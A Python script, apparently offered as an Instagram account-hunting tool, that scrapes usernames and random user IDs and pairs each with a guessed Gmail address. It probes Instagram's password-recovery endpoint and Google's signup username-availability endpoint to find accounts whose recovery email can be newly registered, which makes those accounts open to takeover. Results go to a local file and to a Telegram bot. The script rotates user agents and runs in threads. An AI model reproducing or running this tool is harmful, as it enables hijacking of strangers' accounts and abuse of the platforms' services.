import webbrowser
webbrowser.open('https://t.me/pytho2n')
import os
import requests
from user_agent import generate_user_agent
from time import time, sleep
from random import choice, randint, uniform, randrange, choices
from concurrent.futures import ThreadPoolExecutor
from asmix import Instagram
import string
import random


aras1 = 0
aras2 = 0
aras3 = 0
aras4 = 0
aras5 = 0

aras6 = {
    2011: 0, 2012: 0, 2013: 0, 2014: 0, 2015: 0,
    2016: 0, 2017: 0, 2018: 0, 2019: 0, 2020: 0,
    2021: 0, 2022: 0, 2023: 0, 2024: 0, 2025: 0
}

aras7 = {}


green = '\033[1;32m'
red = '\033[1;31m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
cyan = '\033[1;36m'
white = '\033[1;37m'
reset = '\033[0m'
a5 = '\x1b[38;5;208m'
a12 = '\x1b[38;5;220m'
C = '\033[2;35m'
F = '\033[2;32m'
Z = '\x1b[1m\x1b[32m'
Y = '\x1b[1m\x1b[33m'
R = '\x1b[1m\x1b[31m'
W = '\x1b[1m\x1b[37m'
C = '\x1b[1m\x1b[36m'
X = '\x1b[0m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'#حقـوق اراس • @W4_M4
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
c1 = '\x1b[38;5;120m'
j21 = '\x1b[38;5;204m'
p1 = '\x1b[38;5;150m'
cyan = "\033[1m\033[36m"
x = '\x1b[1;33m'#حقـوق اراس • @W4_M4
white = '\x1b[1;37m'
z = '\x1b[1;31m'
bi = random.randint(5,208)
ror1 = f'\x1b[38;5;{bi}m'
memo = random.randint(100, 300)
ror = f'\x1b[38;5;{memo}m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق#حقـوق اراس • @W4_M4
C = '\033[2;35m'  # وردي
S = '\033[2;36m'  # سمائي
G = '\033[1;34m'  # ازرق فاتح
HH = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابيض
Y = "\033[1;33m"  # Yellow
R = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر#حقـوق اراس • @W4_M4
F = '\033[2;31m'  # اخضر
C = "\033[1;97m"  # ابيض
B = '\033[2;36m'  # سمائي
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
S = '\033[2;36m'#حقـوق اراس • @W4_M4
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"#حقـوق اراس • @W4_M4
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
a1 = '\x1b[1;31m'  # أح.مر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أز.رق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخض.ر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أ.صفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m'
J22 = '\x1b[38;5;209m'
J21 = '\x1b[38;5;204m'
J2 = '\x1b[38;5;203m'
J1 = '\x1b[38;5;202m'
E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'#حقـوق اراس • @W4_M4
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
G = '\033[1;34m'
HH = '\033[1;34m'
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"#حقـوق اراس • @W4_M4
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
O = '\x1b[38;5;208m'
Y = '\033[1;34m'#حقـوق اراس • @W4_M4
C = '\033[2;35m'
M = '\x1b[1;37m'#حقـوق اراس • @W4_M4
pink_t5ok5 = '\x1b[38;5;199m'
WHITE_BOLD = '\x1b[1;97m'
reset = '\x1b[0m'
HH = random.choice([a1, a2, a3, a4, a5, a14, a18, a20, a21, a22, a23, a26, a27, a37, a38, a40 ,Y ,C,M,pink_t5ok5])
HH = '\x1b[38;5;199m'
print(HH)

def aras():
    print(f"""                                 	
       █████╗      ██████╗       █████╗      ███████╗
      ██╔══██╗     ██╔══██╗     ██╔══██╗     ██╔════╝
      ███████║     ██████╔╝     ███████║     ███████╗
      ██╔══██║     ██╔══██╗     ██╔══██║     ╚════██║
      ██║  ██║     ██║  ██║     ██║  ██║     ███████║
      ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚═╝  ╚═╝     ╚══════╝

            {C}.•´¯`•.¸¸ {F} INSTA {C}¸.•´¯`•.¸¸              
            
               {white}TLE : @W4_M4 / @pytho2n 
                     
""")

aras()
ID = input(f"{C} 𝐈𝐃 :  ")
print('')
token = input(f"{C} 𝐓𝐎𝐊𝐄𝐍 : ")
webbrowser.open('https://t.me/pytho2n')
print('')

os.system('clear')



def aras8(aras9):

    try:
        aras10 = {
            'rur': '"LDC\\05467838469205\\0541758153066:01f72be7578ed09a57bfe3e41c19af58848e0e965e0549f6d1f5a0168a652d2bfa28cd9a"',
        }
        
        aras11 = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'user-agent': str(generate_user_agent()),
            'x-asbd-id': '129477',
            'x-csrftoken': 'mf3zd6qWxnKgh9BaNRI5Ldpms2NrH62X',
            'x-fb-friendly-name': 'PolarisSearchBoxRefetchableQuery',
            'x-fb-lsd': 'BslibIYRWxn19hyIaPyrZV',
            'x-ig-app-id': '936619743392459',
        }
        
        aras12 = {
            'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+aras9+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
            'doc_id': '7935512656557707',
        }
        
        aras13 = requests.post('https://www.instagram.com/graphql/query', 
                               cookies=aras10, headers=aras11, data=aras12, timeout=10)
        
        if aras13.status_code == 200:
            aras14 = aras13.json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
            return aras14
        return []
    except:
        return []


def aras15():

    try:
        aras16 = randint(2500000000, 21254029834)
        
        aras17 = {
            'X-FB-LSD': ''.join(choices(string.ascii_letters + string.digits, k=32)),
            'User-Agent': str(generate_user_agent()),
        }
        
        aras18 = {
            "lsd": ''.join(choices(string.ascii_letters + string.digits, k=32)),
            "variables": '{"id":' + str(aras16) + ',"render_surface":"PROFILE"}',
            "doc_id": "25618261841150840"
        }
        
        aras19 = requests.post('https://www.instagram.com/api/graphql',
                               headers=aras17, data=aras18, timeout=10)
        
        if aras19.status_code == 200:
            aras20 = aras19.json()['data']['user']
            aras21 = aras20.get('username')
            if aras21:
                aras7[aras21] = {
                    'pk': aras16,
                    'full_name': aras20.get('full_name', 'none'),
                    'follower_count': aras20.get('edge_followed_by', {}).get('count', 0),
                    'following_count': aras20.get('edge_follow', {}).get('count', 0),
                    'media_count': aras20.get('edge_owner_to_timeline_media', {}).get('count', 0),
                    'biography': aras20.get('biography', 'none'),
                }
                return aras21
        return None
    except:
        return None




def aras22():
    try:
        aras23 = 'azertyuiopmlkjhgfdsqwxcvbn'
        aras24 = ''.join(choice(aras23) for i in range(randrange(6, 9)))
        aras25 = ''.join(choice(aras23) for i in range(randrange(3, 9)))
        aras26 = ''.join(choice(aras23) for i in range(randrange(15, 30)))
        
        aras27 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "user-agent": str(generate_user_agent()),
        }

        aras28 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
                           headers=aras27, timeout=15)
        
        import re
        aras29 = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', aras28.text).group(2)
        
        aras30 = {'__Host-GAPS': aras26}
        aras31 = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': str(generate_user_agent()),
        }
        
        aras32 = {
            'f.req': '["'+aras29+'","'+aras24+'","'+aras25+'","'+aras24+'","'+aras25+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        
        aras33 = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=aras30, headers=aras31, data=aras32, timeout=15
        )
        
        aras34 = str(aras33.text).split('",null,"')[1].split('"')[0]
        aras35 = aras33.cookies.get_dict()['__Host-GAPS']
        
        try:
            os.remove('tl.txt')
        except:
            pass
        with open('tl.txt', 'a') as f:
            f.write(aras34 + '//' + aras35 + '\n')
    except:
        sleep(3)
        aras22()

aras22()


def aras36(aras37):
    try:
        aras38 = [
            (1279000, 2010), (17750000, 2011), (279760000, 2012),
            (900990000, 2013), (1629010000, 2014), (2500000000, 2015),
            (3713668786, 2016), (5699785217, 2017), (8597939245, 2018),
            (21254029834, 2019)
        ]
        for aras39, aras40 in aras38:
            if aras37 <= aras39:
                return aras40
        return 2023
    except:
        return 'none'


def aras41(aras42):
    global aras4
    if '@' in aras42:
        aras42 = str(aras42).split('@')[0]
    
    aras43 = 3
    for aras44 in range(aras43):
        try:
            sleep(uniform(0.5, 1.5))
            
            try:
                aras45 = open('tl.txt','r').read().splitlines()[0]
            except:
                aras22()
                aras45 = open('tl.txt','r').read().splitlines()[0]
            
            aras46, aras47 = aras45.split('//')
            aras48 = {'__Host-GAPS': aras47}
            
            aras49 = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': str(generate_user_agent()),
            }
            
            aras50 = {'TL': aras46}
            aras51 = f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&f.req=%5B%22TL%3A{aras46}%22%2C%22{aras42}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            
            aras52 = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=aras50, cookies=aras48, headers=aras49, data=aras51, timeout=15
            )
            
            if '"gf.uar",1' in str(aras52.text): 
                return 'good'
            elif '"er",null,null,null,null,400' in str(aras52.text):
                aras22()
                sleep(2)
                continue
            else: 
                return 'bad'
        except:
            if aras44 < aras43 - 1:
                sleep(2)
                continue
            return 'bad'
    return 'bad'


def aras53(aras54, aras55):
    global aras2, aras1, aras6
    aras2 += 1
    aras1 += 1
    
    aras56 = aras7.get(aras54, {})
    aras57 = aras56.get('pk', 'none')
    aras58 = aras56.get('full_name', 'none')
    aras59 = aras56.get('follower_count', '0')
    aras60 = aras56.get('following_count', '0')
    aras61 = aras56.get('media_count', '0')
    aras62 = aras56.get('biography', 'none')
    
    try:
        aras63 = int(aras57) if aras57 != 'none' else None
        aras64 = aras36(aras63) if aras63 else 'none'
    except:
        aras64 = 'none'
    
    if isinstance(aras64, int) and aras64 in aras6:
        aras6[aras64] += 1
    
    try:
        aras65 = Instagram.rest(aras54)
    except:
        aras65 = 'none'
    
    aras66 = f"""═══════˛ 𝗜𝗡𝗦𝗧𝗔 .═══════
☀ Hit : {aras1}
☀ Name : {aras58}
☀ Uid : {aras57}
☀ Username : {aras54}
☀ Followers : {aras59}
☀ Following : {aras60}
☀ Post : {aras61}
☀ Bio : {aras62}
☀ Year : {aras64}
☀ Email : {aras54}@{aras55}
☀ Rest : {aras65}
☀ Url : instagram.com/{aras54}
☀ By : @W4_M4
☀ Ch : @pytho2n
═══════˛ 𝗜𝗡𝗦𝗧𝗔 .═══════"""
    
    print(aras66)
    
    with open('hits.txt', 'a') as file:
        file.write(f'{aras66}\n')
    
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={aras66}", timeout=10)
    except:
        pass
    
    aras67()


def aras68(aras69):
    global aras4
    try:
        if 'good' == aras41(aras69):
            aras70, aras71 = aras69.split('@')
            aras53(aras70, aras71)
        else:
            aras4 += 1
            aras67()
    except:
        aras4 += 1
        aras67()


def aras67():
    aras72 = f'''{C}< 𖤐⌁𖤐⌁𖤐⌁𖤐⌁𖤐⌁𖤐 >
{green}⦿ 𝗛𝗶𝘁𝘀      : {green}{aras2}{reset}
{red}⦿ 𝐛𝐚𝐝 𝐈𝐧𝐬𝐭𝐚   : {red}{aras3}{reset}
{yellow}⦿ 𝐛𝐚𝐝 𝐆𝐦𝐚𝐢𝐥 : {yellow}{aras4}{reset}
{C}< 𖤐⌁𖤐⌁𖤐⌁𖤐⌁𖤐⌁𖤐 >
{a5}۞ 𝟤𝟢𝟣𝟣 : {aras6[2011]}
۞ 𝟤𝟢𝟣𝟤 : {aras6[2012]}
۞ 𝟤𝟢𝟣𝟥 : {aras6[2013]}
۞ 𝟤𝟢𝟣𝟦 : {aras6[2014]}
۞ 𝟤𝟢𝟣𝟧 : {aras6[2015]}
۞ 𝟤𝟢𝟣𝟨 : {aras6[2016]}
۞ 𝟤𝟢𝟣𝟩 : {aras6[2017]}
۞ 𝟤𝟢𝟣𝟪 : {aras6[2018]}
۞ 𝟤𝟢𝟣𝟫 : {aras6[2019]}
۞ 𝟤𝟢𝟤𝟢 : {aras6[2020]}
۞ 𝟤𝟢𝟤𝟣 : {aras6[2021]}
۞ 𝟤𝟢𝟤𝟤 : {aras6[2022]}
۞ 𝟤𝟢𝟤𝟥 : {aras6[2023]}
۞ 𝟤𝟢𝟤𝟦 : {aras6[2024]}
۞ 𝟤𝟢𝟤𝟧 : {aras6[2025]}{reset}
{C}< 𖤐⌁𖤐⌁𖤐⌁𖤐⌁𖤐⌁𖤐 >
{a12}𝐁𝐲 ⋮ @W4_M4 ┃ 𝐀𝐑𝐀𝐒 {reset}'''
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(aras72)


def aras73(aras74):
    global aras3, aras5
    aras5 += 1
    
    aras75 = 2
    for aras76 in range(aras75):
        try:
            sleep(uniform(0.5, 1))
            
            aras77 = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': str(int(time())) + '.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com',
            }

            aras78 = ''.join(choices('abcdef0123456789', k=36))
            aras79 = ''.join(choices('abcdef0123456789', k=36))
            aras80 = ''.join(choices('abcdef0123456789', k=36))

            aras81 = {
                'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{aras78}","guid":"{aras79}","device_id":"{aras80}","query":"{aras74}"}}',
                'ig_sig_key_version': '4',
            }

            aras82 = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
                                  headers=aras77, data=aras81, timeout=15).text

            if '"status":"ok"' in aras82:
                aras68(aras74)
                break
            else:
                aras3 += 1
                aras67()
                break
        except:
            if aras76 < aras75 - 1:
                sleep(2)
                continue
            aras3 += 1
            aras67()
            break




def aras83():

    
    aras84 = [
        'azertyuiopmlkjhgfdsqwxcvbn',  
        'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
        'abcdefghijklmnopqrstuvwxyzñ',  
        'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
        '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
        'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
        'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
        'אבגדהוזחטיכלמנסעפצקרשת',  
        'αβγδεζηθικλμνξοπρστυφχψω',  
        'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
        'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
    ]
    
    while True:
        try:
            sleep(uniform(2, 4))
            
          
            aras85 = choices(['keyword', 'random_id'], weights=[70, 30])[0]
            
            if aras85 == 'keyword':
               
                aras86 = choice(aras84)
                aras87 = ''.join(choice(aras86) for _ in range(randrange(4, 9)))
                
                aras88 = aras8(aras87)
                
                for aras89 in aras88:
                    try:
                        aras90 = aras89['user']['username']
                        
                        aras7[aras90] = aras89['user']
                        aras91 = aras90 + "@gmail.com"
                        aras73(aras91)
                    except:
                        continue
                        
            else:
              
                aras92 = aras15()
                if aras92:
                    aras93 = aras92 + "@gmail.com"
                    aras73(aras93)
                    
        except:
            sleep(3)
            continue




os.system('clear')
aras67()


sleep(2)

aras94 = ThreadPoolExecutor(max_workers=5)
for i in range(5):
    aras94.submit(aras83)
    sleep(2)